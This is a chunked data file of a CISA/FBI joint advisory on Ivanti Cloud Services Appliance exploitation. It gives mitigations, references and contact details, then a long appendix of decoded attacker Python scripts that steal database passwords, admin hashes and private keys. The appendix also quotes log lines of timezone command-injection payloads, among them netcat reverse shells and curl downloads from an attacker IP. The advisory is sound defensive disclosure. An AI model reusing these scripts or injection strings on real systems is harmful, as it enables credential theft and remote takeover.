+  "id": "p182",
+  "text": "Mitigations\n        CISA and FBI recommend organizations:\n                Upgrade to the latest supported version of Ivanti CSA immediately for continued support.[3] Please\n                 note that Ivanti CSA 4.6 is EOL and no longer receives patches or third-party libraries. Customers\n                 must upgrade to the latest version of the product for continued support.\n                Install endpoint detection and response (EDR) on the system to alert network defenders on\n                 unusual and potentially malicious activity.\n                Establish a baseline and maintain detailed logs of network traffic, account behavior, and software.\n                 This can assist network defenders in identifying anomalies that may indicate malicious activity\n                 more quickly.\n                Keep all operating systems, software, and firmware up to date. Timely patching is one of the most\n                 efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity\n                 threats. Organizations should patch vulnerable software and hardware systems within 24 to 48\n                 hours of vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-\n                 facing systems [CPG 1.E].\n                Secure remote access tools by:\n                 o    Implementing application controls to manage and control software execution, including\n                      allowlisting remote access programs. Application controls should prevent installation and\n                      execution of portable versions of unauthorized remote access and other software. A properly\n                      configured application allowlisting solution will block any unlisted application execution.\n                      Allowlisting is important because antivirus solutions may fail to detect the execution of\n                      malicious portable executables when the files use any combination of compression, encryption,\n                      or obfuscation.\n                Strictly limit the use of remote desktop protocol (RDP) and other remote desktop services. If RDP is\n                 necessary, rigorously apply best practices, for example [CPG 2.W]:\n                 o    Audit the network for systems using RDP.\n                 o    Close unused RDP ports.\n                 o    Enforce account lockouts after a specified number of attempts.\n                 o    Apply phishing-resistant multifactor authentication (MFA).\n                 o    Log RDP login attempts.\n                Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec\n                 operations requiring administrator privileges to reduce the risk of lateral movement by PsExec."
+ },
+ {
+  "id": "p183",
+  "text": "   Follow best cybersecurity practices in your production and enterprise environments, including\n                 mandating phishing-resistant multifactor authentication (MFA) for all staff and services. For\n                 additional best practices, see CISA’s Cross-Sector Cybersecurity Performance Goals (CPGs). The\n                 CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a\n                 prioritized subset of IT and OT security practices that can meaningfully reduce the likelihood and\n                 impact of known cyber risks and common tactics, techniques, and procedures. Because the CPGs\n                 are a subset of best practices, CISA and FBI also recommend software manufacturers implement a\n                 comprehensive information security program based on a recognized framework, such as the NIST\n                 Cybersecurity Framework (CSF)."
+ },
+ {
+  "id": "p184",
+  "text": "Validate Security Controls\n        In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your\n        organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise\n        framework in this advisory. CISA and FBI recommend testing your existing security controls inventory to\n        assess how they perform against the ATT&CK techniques described in this advisory.\n        To get started:\n             1. Select an ATT&CK technique described in this advisory (see Table 4 through Table 13).\n             2. Align your security technologies against the technique.\n             3. Test your technologies against the technique.\n             4. Analyze your detection and prevention technologies’ performance.\n             5. Repeat the process for all security technologies to obtain a set of comprehensive performance\n                data.\n             6. Tune your security program, including people, processes, and technologies, based on the data\n                generated by this process.\n        CISA and FBI recommend continually testing your security program, at scale, in a production environment\n        to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory."
+ },
+ {
+  "id": "p185",
+  "text": "References\n        [1] Ivanti: Security Advisory Ivanti CSA (Cloud Services Application) (CVE-2024-9379, CVE-2024-9380,\n            CVE-2024-9381)\n        [2] Ivanti: Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)\n        [3] Ivanti: Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)\n        [4] Fortinet: Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA"
+ },
+ {
+  "id": "p186",
+  "text": "Contact Information\n        Organizations are encouraged to report suspicious or criminal activity related to information in this advisory\n        to:\n                CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870) or your local FBI field\n                 office. When available, please include the following information regarding the incident: date, time,\n                 and location of the incident; type of activity; number of people affected; type of equipment used for\n                 the activity; the name of the submitting company or organization; and a designated point of\n                 contact."
+ },
+ {
+  "id": "p187",
+  "text": "Disclaimer\n        The information in this report is being provided “as is” for informational purposes only. CISA and FBI do not\n        endorse any commercial entity, product, company, or service, including any entities, products, or services\n        linked within this document. Any reference to specific commercial entities, products, processes, or services\n        by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement,\n        recommendation, or favoring by CISA and FBI."
+ },
+ {
+  "id": "p188",
+  "text": "Version History\n        January 22, 2025: Initial version.\n        January 31, 2025: Removed IOCs."
+ },
+ {
+  "id": "p189",
+  "text": "Appendix A: Encoded and Decoded Scripts\n        Decoded Python Scripts\n          {\n          import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n               if t and m:\n                   msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n               else:\n                   msg = ''\n               os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n               r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n               r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n               dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read())[0]\n          if r:\n               p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin'\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n               os.system(\"tar zxvf {}\".format(r))\n               while True:\n                   for f in os.listdir('.'):\n                        if re.match(\"php\\w{6}\", f):\n                            os.chmod(f, 0o777)\n                            m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                            if m:\n                                set_msg(dbpwd, \"PASSWORD\", m)\n                                time.sleep(30)\n                                set_msg(dbpwd)\n                                exit()\n          else:\n               set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          }"
+ },
+ {
+  "id": "p190",
+  "text": "{\n          import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):"
+ },
+ {
+  "id": "p191",
+  "text": "if t and m:\n                   msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n               else:\n                   msg = ''\n               os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='service'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n               r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n               r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n               dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read())[0]\n          if r:\n               p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'service'\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n               os.system(\"tar zxvf {}\".format(r))\n               while True:\n                   for f in os.listdir('.'):\n                        if re.match(\"php\\w{6}\", f):\n                            os.chmod(f, 0o777)\n                            m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                            if m:\n                                set_msg(dbpwd, \"PASSWORD\", m)\n                                time.sleep(30)\n                                set_msg(dbpwd)\n                                exit()\n          else:\n               set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          }"
+ },
+ {
+  "id": "p192",
+  "text": "import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n               if t and m:\n                   msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n               else:\n                   msg = ''\n               os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n               r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)"
+ },
+ {
+  "id": "p193",
+  "text": "except:\n              r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n              dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read())[0]\n          if r:\n              p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n              os.system(\"tar zxvf {}\".format(r))\n              while True:\n                  for f in os.listdir('.'):\n                       if re.match(\"php\\w{6}\", f):\n                           os.chmod(f, 0o777)\n                           m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                           if m:\n                               set_msg(dbpwd, \"PASSWORD\", m)\n                               time.sleep(30)\n                               set_msg(dbpwd)\n                               exit()\n          else:\n              set_msg(dbpwd, 'ERROR', 'NO BACKUP')"
+ },
+ {
+  "id": "p194",
+  "text": "import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n               if t and m:\n                   msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n               else:\n                   msg = ''\n               os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n               r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n               r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n               dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read())[0]\n          if r:\n               p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n               os.system(\"tar zxvf {}\".format(r))\n               while True:\n                   for f in os.listdir('.'):"
+ },
+ {
+  "id": "p195",
+  "text": "if re.match(\"php\\w{6}\", f):\n                          os.chmod(f, 0o777)\n                          m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                          if m:\n                              set_msg(dbpwd, \"PASSWORD\", m)\n                              time.sleep(30)\n                              set_msg(dbpwd)\n                              exit()\n          else:\n              set_msg(dbpwd, 'ERROR', 'NO BACKUP')"
+ },
+ {
+  "id": "p196",
+  "text": "{\n          import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n              if t and m:\n                  msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n              else:\n                  msg = ''\n              os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}',lockoutalert=0,attempts=0 where username='admin'\"|psql -d\n          brokerdb -U gsbadmin'''.format(p, msg))"
+ },
+ {
+  "id": "p197",
+  "text": "with open(\"/opt/landesk/broker/broker.conf\") as f:\n              dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read())[0]"
+ },
+ {
+  "id": "p198",
+  "text": "p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip()\n              v = p.split(':')\n              k = os.popen('base 64 -w0 root/.certs/{}.key'.format(v[1])).read()\n              set_msg(dbpwd, \"PASSWORD\", p+'||'+k)\n              time.sleep(30)\n              set_msg(dbpwd)\n          }"
+ },
+ {
+  "id": "p199",
+  "text": "{\n          import os, re, base64, time"
+ },
+ {
+  "id": "p200",
+  "text": "def set_msg(p, t='', m=''):\n              if t and m:\n                  msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n              else:\n                  msg = ''"
+ },
+ {
+  "id": "p201",
+  "text": "os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}',lockoutalert=0 where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))"
+ },
+ {
+  "id": "p202",
+  "text": "os.chdir(\"/tmp\")\n          d = \"/backups\"\n          try:\n               r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n               r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n               dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read())[0]\n               os.system('''export PGPASSWORD={};echo \"delete from user_info where\n          runas='Nobody'\"|psql -d brokerdb -U gsbadmin'''.format(dbpwd))\n               if r:\n                   p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info\n          WHERE username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n                   os.system(\"tar zxvf {}\".format(r))\n                   while True:\n                        for f in os.listdir('.'):\n                            if re.match(\"php\\w{6}\", f):\n                                os.chmod(f, 0o777)\n                                m = os.popen(\"./{} '{}' '{}' '{}' root/.certs/{}.key\n          {}\".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()\n                                if m:\n                                    set_msg(dbpwd, \"PASSWORD\", m)\n                                    time.sleep(30)\n                                    set_msg(dbpwd)\n                                    exit()\n               else:\n                   set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          }"
+ },
+ {
+  "id": "p203",
+  "text": "{\n          import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n               if t and m:\n                   msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n               else:\n                   msg = ''\n               os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:"
+ },
+ {
+  "id": "p204",
+  "text": "r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n              r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n              dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read())[0]\n              os.system('''export PGPASSWORD={};echo \"delete from user_info where\n          runas='Nobody'\"|psql -d brokerdb -U gsbadmin'''.format(dbpwd))\n          if r:\n              p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n              os.system(\"tar zxvf {}\".format(r))\n              while True:\n                  for f in os.listdir('.'):\n                       if re.match(\"php\\w{6}\", f):\n                           os.chmod(f, 0o777)\n                           m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                           if m:\n                               set_msg(dbpwd, \"PASSWORD\", m)\n                               time.sleep(30)\n                               set_msg(dbpwd)\n                               exit()\n          else:\n              set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          }"
+ },
+ {
+  "id": "p205",
+  "text": "Decoded datetime.php 'timezone' Exploit base64 Scripts\n          {\n          Sep 5 01:09:59 REDACTED gsb[996]: /etc/php.ini\n          rewritten with new timezone: ';export PGPASSWORD=`cat\n          /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-`;echo\n          \"update user_info set organization='||/usr/bin/echo import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n             if t and m:\n                 msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n             else:\n                 msg = ''\n             os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n             r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)"
+ },
+ {
+  "id": "p206",
+  "text": "except:\n             r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n             dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read\n          ())[0]\n          if r:\n             p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n             os.system(\"tar zxvf {}\".format(r))\n             while True:\n                 for f in os.listdir('.'):\n                      if re.match(\"php\\w{6}\", f):\n                          os.chmod(f, 0o777)\n                          m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                          if m:\n                              set_msg(dbpwd, \"PASSWORD\", m)\n                              time.sleep(30)\n                              set_msg(dbpwd)\n                              exit()\n          else:\n             set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          | /usr/bin/base64 -d | python||' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin;' (1)\n          }"
+ },
+ {
+  "id": "p207",
+  "text": "{\n          Sep 5 01:47:01 REDACTED gsb[2599]: /etc/php.ini\n          rewritten with new timezone: ';/usr/bin/echo\n          import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n             if t and m:\n                 msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n             else:\n                 msg = ''\n             os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n             r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n             r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n             dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read"
+ },
+ {
+  "id": "p208",
+  "text": "())[0]\n          if r:\n             p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n             os.system(\"tar zxvf {}\".format(r))\n             while True:\n                 for f in os.listdir('.'):\n                     if re.match(\"php\\w{6}\", f):\n                         os.chmod(f, 0o777)\n                         m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                         if m:\n                             set_msg(dbpwd, \"PASSWORD\", m)\n                             time.sleep(30)\n                             set_msg(dbpwd)\n                             exit()\n          else:\n             set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          | /usr/bin/base64 -d | python;' (1)\n          }"
+ },
+ {
+  "id": "p209",
+  "text": "{\n          Sep 5 02:14:08 REDACTED gsb[1273]: /etc/php.ini\n          rewritten with new timezone: ';export PGPASSWORD=`cat\n          /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-`;echo\n          \"update user_info set organization='||/usr/bin/echo import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n             if t and m:\n                 msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n             else:\n                 msg = ''\n             os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n             r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n             r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n             dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read\n          ())[0]\n          if r:"
+ },
+ {
+  "id": "p210",
+  "text": "p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n             os.system(\"tar zxvf {}\".format(r))\n             while True:\n                 for f in os.listdir('.'):\n                     if re.match(\"php\\w{6}\", f):\n                         os.chmod(f, 0o777)\n                         m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                         if m:\n                             set_msg(dbpwd, \"PASSWORD\", m)\n                             time.sleep(30)\n                             set_msg(dbpwd)\n                             exit()\n          else:\n             set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          | /usr/bin/base64 -d | python||' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin;' (1)\n          }"
+ },
+ {
+  "id": "p211",
+  "text": "{\n          Sep 5 22:22:06 REDACTED gsb[9367]: /etc/php.ini\n          rewritten with new timezone: ';export PGPASSWORD=`cat\n          /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-`;echo\n          \"update user_info set organization='||/usr/bin/echo import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n             if t and m:\n                 msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n             else:\n                 msg = ''\n             os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n             r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n             r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n             dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read\n          ())[0]\n          if r:\n             p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')"
+ },
+ {
+  "id": "p212",
+  "text": "os.system(\"tar zxvf {}\".format(r))\n             while True:\n                 for f in os.listdir('.'):\n                     if re.match(\"php\\w{6}\", f):\n                         os.chmod(f, 0o777)\n                         m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                         if m:\n                             set_msg(dbpwd, \"PASSWORD\", m)\n                             time.sleep(30)\n                             set_msg(dbpwd)\n                             exit()\n          else:\n             set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          | /usr/bin/base64 -d | python||' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin;' (1)\n          }"
+ },
+ {
+  "id": "p213",
+  "text": "{\n          Sep 6 02:39:11 REDACTED gsb[21266]: /etc/php.ini\n          rewritten with new timezone: ';/usr/bin/echo\n          import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n             if t and m:\n                 msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n             else:\n                 msg = ''\n             os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n             r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n             r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n             dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read\n          ())[0]\n          if r:\n             p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n             os.system(\"tar zxvf {}\".format(r))\n             while True:\n                 for f in os.listdir('.'):\n                      if re.match(\"php\\w{6}\", f):"
+ },
+ {
+  "id": "p214",
+  "text": "os.chmod(f, 0o777)\n                         m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                         if m:\n                             set_msg(dbpwd, \"PASSWORD\", m)\n                             time.sleep(30)\n                             set_msg(dbpwd)\n                             exit()\n          else:\n             set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          | /usr/bin/base64 -d | python;' (1)\n          }"
+ },
+ {
+  "id": "p215",
+  "text": "{\n          Sep 6 03:03:44 REDACTED gsb[11427]: /etc/php.ini\n          rewritten with new timezone: ';bash /tmp/Xa27efd2.tmp;' (1)\n          }\n          {\n          Sep 8 05:18:35 REDACTED gsb[5132]: /etc/php.ini\n          rewritten with new timezone: ';/sbin/backuptool --backup;' (1)\n          }"
+ },
+ {
+  "id": "p216",
+  "text": "{\n          Sep 8 05:19:34 REDACTED gsb[5325]: /etc/php.ini\n          rewritten with new timezone: ';/usr/bin/echo\n          import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n             if t and m:\n                 msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n             else:\n                 msg = ''\n             os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n             r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n             r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n             dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read\n          ())[0]\n          if r:"
+ },
+ {
+  "id": "p217",
+  "text": "p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n             os.system(\"tar zxvf {}\".format(r))\n             while True:\n                 for f in os.listdir('.'):\n                     if re.match(\"php\\w{6}\", f):\n                         os.chmod(f, 0o777)\n                         m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                         if m:\n                             set_msg(dbpwd, \"PASSWORD\", m)\n                             time.sleep(30)\n                             set_msg(dbpwd)\n                             exit()\n          else:\n             set_msg(dbpwd, 'ERROR', 'NO BACKUP')\n          | /usr/bin/base64 -d | python;' (1)\n          }"
+ },
+ {
+  "id": "p218",
+  "text": "{\n          Sep 8 10:37:35 REDACTED gsb[6196]: /etc/php.ini\n          rewritten with new timezone: ';nc REDACTED\n          80 -ssl -e /bin/bash;' (1)\n          }"
+ },
+ {
+  "id": "p219",
+  "text": "{\n          Sep 8 10:40:38 REDACTED gsb[8758]: /etc/php.ini\n          rewritten with new timezone: ';curl https://gggg.oyr2ohrm.eyes.sh\n          /;' (1)\n          }"
+ },
+ {
+  "id": "p220",
+  "text": "{\n          Sep 8 10:41:35 REDACTED gsb[7475]: /etc/php.ini\n          rewritten with new timezone: ';curl 98.98.54.209/a.sh -o /dev/shm/a.sh\n          ;' (1)\n          }"
+ },
+ {
+  "id": "p221",
+  "text": "{\n          Sep 8 13:10:37 REDACTED gsb[22555]: /etc/php.ini\n          rewritten with new timezone: ';nc REDACTED\n          80 --ssl -e /bin/bash;' (1)\n          }"
+ },
+ {
+  "id": "p222",
+  "text": "{\n          Sep 8 13:21:06 REDACTED gsb[24954]: /etc/php.ini\n          rewritten with new timezone: ';nc REDACTED\n          80 --ssl -e /bin/bash;' (1)\n          }"
+ },
+ {
+  "id": "p223",
+  "text": "{\n          Sep 8 20:23:14 REDACTED gsb[1899]: /etc/php.ini\n          rewritten with new timezone: ';export PGPASSWORD=`cat\n          /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-`;echo\n          \"update user_info set organization='||/usr/bin/echo import os, re, base64, time\n          os.chdir(\"/tmp\")\n          d = \"/backups\"\n          def set_msg(p, t='', m=''):\n             if t and m:\n                 msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())\n             else:\n                 msg = ''\n             os.system('''export PGPASSWORD={};echo \"update user_info set\n          organization='{}' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin'''.format(p, msg))\n          try:\n             r = max([os.path.join(d, f) for f in os.listdir(d) if\n          os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)\n          except:\n             r = None\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n             dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read\n          ())[0]\n          if r:\n             p = os.popen(\"export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE\n          username=\\\\'admin\\\\' | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().split(\"\\n\")[-4].strip().split(':')\n             os.system(\"tar zxvf {}\".format(r))\n             while True:\n                 for f in os.listdir('.'):\n                      if re.match(\"php\\w{6}\", f):\n                          os.chmod(f, 0o777)\n                          m = os.popen(\"./{} {} {} {} root/.certs/{}.key {}\".format(f,\n          p[4], p[5], p[6], p[1], p[1])).read().strip()\n                          if m:\n                              set_msg(dbpwd, \"PASSWORD\", m)\n                              time.sleep(30)\n                              set_msg(dbpwd)\n                              exit()\n          else:\n             set_msg(dbpwd, 'ERROR', 'NO BACKUP')"
+ },
+ {
+  "id": "p224",
+  "text": "| /usr/bin/base64 -d | python||' where username='admin'\"|psql -d brokerdb -U\n          gsbadmin;' (1)\n          }"
+ },
+ {
+  "id": "p225",
